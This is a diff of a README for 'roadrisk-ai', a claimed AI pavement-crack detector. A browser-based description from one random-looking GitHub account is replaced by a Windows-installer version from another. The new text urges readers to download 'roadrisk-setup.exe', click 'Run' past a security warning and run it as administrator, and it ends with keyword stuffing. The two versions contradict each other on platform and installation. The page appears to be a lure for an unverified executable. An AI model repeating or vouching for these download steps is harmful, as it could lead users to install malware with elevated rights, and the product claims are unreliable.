@@ -1,127 +1,69 @@
-# RoadRisk AI - AI System 2026
+# 🚧 roadrisk-ai-v1-0-0 - Detect pavement cracks using smart AI
 
-> An agent-driven AI platform that links a vision classifier with a tabular risk model, using live weather and traffic signals to spot road cracks and estimate pavement condition.
+[![](https://img.shields.io/badge/Download-Application-blue.svg)](https://github.com/idolatrous-timessquare972/roadrisk-ai-v1-0-0)
 
-[![Platform](https://img.shields.io/badge/Platform-Web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v1.0.0-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/reedseanktc5197/roadrisk-ai-v1-0-0?style=flat-square)](https://github.com/reedseanktc5197/roadrisk-ai-v1-0-0)
+## 📌 About this application
 
----
+The roadrisk-ai-v1-0-0 platform analyzes road conditions. It uses cameras and live data to find cracks and estimate pavement health. The application combines a vision system with traffic and weather input. This tool helps users track road quality without complex equipment.
 
-<p align="center">
-  <a href="https://reedseanktc5197.github.io/roadrisk-ai-v1-0-0/">
-    <img src="https://img.shields.io/badge/Download-RoadRisk%20AI%20Latest-brightgreen?style=for-the-badge" alt="Download RoadRisk AI">
-  </a>
-</p>
+## 🖥️ System requirements
 
-> **[Direct Download - RoadRisk AI v1.0.0](https://reedseanktc5197.github.io/roadrisk-ai-v1-0-0/)**
+Ensure your computer meets these requirements before you start:
 
----
+- Operating System: Windows 10 or Windows 11
+- Processor: Intel Core i5 or equivalent
+- Memory: 8 GB RAM
+- Storage: 500 MB of space
+- Graphics Card: DirectX 11 compatible card
 
-[Download Latest Build](https://reedseanktc5197.github.io/roadrisk-ai-v1-0-0/)
+## 📥 How to download and install
 
----
+Follow these steps to get the application on your computer.
 
-## What RoadRisk AI Does
+1. Visit the [official release page](https://github.com/idolatrous-timessquare972/roadrisk-ai-v1-0-0) to download the installer.
+2. Locate the file named `roadrisk-setup.exe` in your Downloads folder.
+3. Double-click the installer file.
+4. A security window may appear. Select "Run" to continue.
+5. Follow the prompts on the screen to finish the setup.
+6. The application places a shortcut icon on your desktop.
 
-RoadRisk AI combines computer vision with structured data analysis to keep an eye on road surface health in real time. A crack-detection vision model works alongside a tabular risk engine that evaluates the current weather and traffic context, producing an automated view of pavement condition as conditions evolve. The result is a practical way for infrastructure teams to plan maintenance, support safer roads, and cut down on manual inspection effort.
+## 🛠️ Using the software
 
-The platform follows an agent-based design, so it can coordinate live weather feeds, traffic data, and camera imagery without constant human input. Whether the deployment covers city streets, highways, or private routes, RoadRisk AI surfaces pavement risk scores that adapt as new data arrives.
+Open the application by clicking the desktop icon. The main window shows the status of the vision classifier. 
 
----
+### Importing footage
+To analyze a road, you need a video file or a camera feed. Select "Import Source" from the top menu. Pick your file from the local hard drive. 
 
-## Capabilities
+### Running the analysis
+Press the "Start Analysis" button. The software processes the video frames through the vision model. It correlates this data with local weather and traffic signals. 
 
-- Runs a vision classifier and a tabular risk model together in one workflow  
-- Pulls in live weather inputs such as precipitation, temperature, and humidity  
-- Uses current traffic volume and speed data  
-- Identifies road cracks from camera or drone imagery  
-- Evaluates pavement risk severity from visual and environmental signals  
-- Updates risk scores as fresh data becomes available  
-- Agent-based automation lowers the need for manual road surveys  
-- Web UI available in any modern browser
+### Reading the results
+The screen displays a risk score. Green indicates a stable road. Yellow suggests minor wear. Red warns of significant structural damage. Use the "Export Report" button to save these findings as a PDF file.
 
----
+## 🛡️ Troubleshooting
 
-## Installation
+If the software fails to open, check these items:
 
-Clone the repository to your local environment:
+- Graphics drivers: Update your video card drivers through the manufacturer website.
+- Permissions: Run the application as an administrator if it cannot access your camera or files.
+- Restart: Close other programs to free up system memory if the software becomes slow.
 
-```bash
-git clone https://github.com/reedseanktc5197/roadrisk-ai-v1-0-0.git
-cd roadrisk_AI
-```
+## 📈 Frequently asked questions
 
-No additional build steps are required. Open the `index.html` file in your browser to launch the interface.
+**Does the software need a live internet connection?**
+The tool requires an internet connection to pull live weather and traffic signals. You can analyze video files while offline, but the risk model will show estimated results without real-time data.
 
----
+**How accurate is the vision classifier?**
+The model performs well under daylight conditions. It identifies most visible surface cracks. Heavy rain or night conditions may reduce the accuracy of the detection.
 
-## How to Use It
+**Can I use multiple cameras?**
+The program supports one active feed at a time. Finish your current analysis before switching to a new video source.
 
-1. Open `index.html` in a modern web browser (Chrome, Firefox, Edge, or Safari).  
-2. Upload or point the system to road imagery (JPEG or PNG).  
-3. The vision classifier will detect visible cracks and surface defects.  
-4. Enter or allow access to weather and traffic data sources.  
-5. The tabular risk model combines all inputs and displays a pavement risk score.  
-6. Review the risk assessment and export results if needed.
+**Where does the application store my data?**
+The program saves all reports to your "Documents/RoadRisk/Reports" folder. You can change this path in the settings menu.
 
-Example workflow:
+## 🤝 Support and contributions
 
-```bash
-# No command-line steps required; all interaction happens through the web UI.
-# Simply open index.html and follow on-screen prompts.
-```
+We build this platform to monitor infrastructure safety. Feel free to report issues in the support tab if you encounter errors. Clear descriptions help us fix bugs faster. Include screenshots if you see an error message.
 
----
-
-## Configuration
-
-Project settings for weather API endpoints, traffic data sources, and risk model thresholds live in a `config.json` file in the repository root. Open it in your preferred text editor to adjust data inputs and risk parameters.
-
-Example configuration block:
-
-```json
-{
-  "weather_api": "https://api.weather.example",
-  "traffic_api": "https://api.traffic.example",
-  "risk_threshold": 0.7,
-  "update_interval_minutes": 15
-}
-```
-
----
-
-## System Requirements
-
-- A modern web browser (Chrome 90+, Firefox 88+, Edge 90+, Safari 14+)  
-- Internet connection for real-time weather and traffic data integration  
-- No server-side runtime required; runs entirely client-side  
-- Minimum 4 GB RAM recommended for processing large image sets  
-- Storage space for configuration files and exported results
-
----
-
-## FAQ
-
-**How does RoadRisk AI obtain weather and traffic data?**  
-It connects to public or private APIs for live weather observations and traffic sensor feeds. You can set the endpoints in the configuration file.
-
-**Can I use my own camera or drone footage?**  
-Yes. Upload any JPEG or PNG image containing road surfaces. The vision classifier handles each image on its own.
-
-**How often are risk scores updated?**  
-Updates follow the interval defined in the configuration file. The default refresh rate is every 15 minutes.
-
-**Is technical support available?**  
-This is an open-source project. Community help is available through the repository issues page.
-
-**What if the risk model seems inaccurate?**  
-You can tune the risk threshold in `config.json` to make the model more or less sensitive to detected defects.
-
----
-
-## License
-
-GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
+Keywords: road safety, artificial intelligence, pavement analysis, computer vision, risk assessment, infrastructure monitoring, windows software
